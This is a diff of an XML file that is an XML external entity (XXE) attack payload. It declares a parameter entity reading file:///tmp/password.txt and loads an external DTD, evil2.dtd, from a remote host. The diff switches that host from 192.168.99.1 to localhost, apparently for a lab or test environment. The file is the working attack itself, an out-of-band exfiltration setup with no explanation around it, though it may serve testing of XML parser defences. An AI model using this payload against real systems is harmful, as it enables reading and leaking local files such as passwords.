@@ -1,7 +1,8 @@
 <?xml version="1.0"?>
 <!DOCTYPE company [
         <!ENTITY % file_content SYSTEM "file:///tmp/password.txt" >
-        <!ENTITY % dtd SYSTEM "http://192.168.99.1:9999/evil2.dtd">
+        <!--<!ENTITY % dtd SYSTEM "http://192.168.99.1:9999/evil2.dtd">-->
+        <!ENTITY % dtd SYSTEM "http://localhost:9999/evil2.dtd">
         %dtd;
         ]>
 <company>
